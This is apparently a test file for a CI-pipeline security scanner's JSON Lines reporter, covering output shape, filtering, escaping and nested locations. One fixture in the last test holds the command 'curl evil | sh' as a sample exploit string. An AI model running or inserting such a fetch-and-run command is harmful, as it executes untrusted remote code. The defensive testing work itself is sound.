"""Tests for the JSON Lines (newline-delimited JSON) reporter."""
from __future__ import annotations

import json

from pipeline_check.core.checks.base import Finding, Location, Severity
from pipeline_check.core.jsonl_reporter import report_jsonl


def _f(check_id="GHA-001", passed=False, severity=Severity.HIGH, **kw):
    return Finding(
        check_id=check_id,
        title=kw.get("title", "Example finding"),
        severity=severity,
        resource=kw.get("resource", ".github/workflows/ci.yml"),
        description=kw.get("description", "Something is wrong."),
        recommendation=kw.get("recommendation", "Fix it."),
        passed=passed,
        cwe=kw.get("cwe", ()),
        exploit_example=kw.get("exploit_example", None),
        locations=kw.get("locations", []),
    )


def _objs(text: str) -> list[dict]:
    return [json.loads(line) for line in text.splitlines() if line]


class TestShape:
    def test_one_object_per_failing_finding(self):
        out = report_jsonl([_f(check_id="A-1"), _f(check_id="A-2")])
        objs = _objs(out)
        assert [o["check_id"] for o in objs] == ["A-1", "A-2"]

    def test_each_line_is_standalone_json(self):
        out = report_jsonl([_f(), _f(check_id="B")])
        lines = [ln for ln in out.splitlines() if ln]
        # Every line parses on its own (no wrapping array, no trailing comma).
        for ln in lines:
            assert isinstance(json.loads(ln), dict)

    def test_object_carries_core_fields(self):
        o = _objs(report_jsonl([_f(check_id="GHA-008", severity=Severity.CRITICAL)]))[0]
        assert o["check_id"] == "GHA-008"
        assert o["severity"] == "CRITICAL"
        assert o["resource"] == ".github/workflows/ci.yml"

    def test_lines_are_compact_no_indent(self):
        out = report_jsonl([_f()])
        assert ": " not in out and ",\n" not in out

    def test_trailing_newline_when_nonempty(self):
        assert report_jsonl([_f()]).endswith("\n")

    def test_empty_when_no_failing_findings(self):
        assert report_jsonl([]) == ""
        assert report_jsonl([_f(passed=True)]) == ""


class TestFiltering:
    def test_passing_findings_excluded(self):
        out = report_jsonl([_f(check_id="A-1", passed=True), _f(check_id="A-2")])
        objs = _objs(out)
        assert len(objs) == 1 and objs[0]["check_id"] == "A-2"


class TestEscaping:
    def test_special_chars_dont_break_a_line(self):
        bad = 'has a, comma "quotes"\nand a newline'
        o = _objs(report_jsonl([_f(description=bad)]))[0]
        # JSON encoding round-trips the value exactly, on a single line.
        assert o["description"] == bad

    def test_locations_are_nested_not_exploded(self):
        f = _f(locations=[
            Location(path="a.yml", start_line=3),
            Location(path="b.yml", start_line=9),
        ])
        objs = _objs(report_jsonl([f]))
        # One object per finding (not per location), locations nested inside.
        assert len(objs) == 1
        assert len(objs[0]["locations"]) == 2


class TestInlineExplain:
    def test_exploit_example_always_present(self):
        f = _f(exploit_example="curl evil | sh")
        # The structured object carries the field regardless of the flag.
        for flag in (False, True):
            o = _objs(report_jsonl([f], inline_explain=flag))[0]
            assert o["exploit_example"] == "curl evil | sh"
